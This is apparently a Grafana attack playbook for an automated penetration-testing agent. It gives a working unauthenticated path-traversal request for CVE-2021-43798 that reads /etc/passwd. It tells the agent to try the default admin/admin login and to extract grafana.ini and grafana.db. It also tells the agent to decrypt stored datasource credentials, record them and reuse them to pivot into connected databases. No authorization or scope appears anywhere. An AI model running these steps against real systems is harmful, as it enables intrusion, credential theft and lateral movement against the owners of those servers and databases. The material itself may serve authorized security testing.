---
name: grafana
services: [grafana]
summary: Grafana — CVE-2021-43798 path-traversal file read, datasource credential theft
---

# Grafana playbook

Grafana's value is a version-specific unauth file read plus stored datasource credentials.
Use `http_request`. The commands below are **examples** — compose your own from what you find.

## Version & access
- Example: `http_request(GET, http://<host>:3000/api/health)` (version)

look for: the version (decides the CVE); default `admin/admin`.

## Path-traversal file read (CVE-2021-43798, Grafana 8.0–8.3)
Unauthenticated arbitrary file read via the plugin path.
- Example: `http_request(GET, http://<host>:3000/public/plugins/alertlist/../../../../../../../../etc/passwd)`
- then read `conf/grafana.ini` and `data/grafana.db` for secrets

look for: a vulnerable 8.x version; the read returns file content → grab grafana.db + config.

## Datasource credentials
Configured datasources (SQL, etc.) store credentials Grafana can decrypt → pivot to those DBs.

## Record
File read / credential theft = high→critical; `record_credential` datasource creds and reuse them.
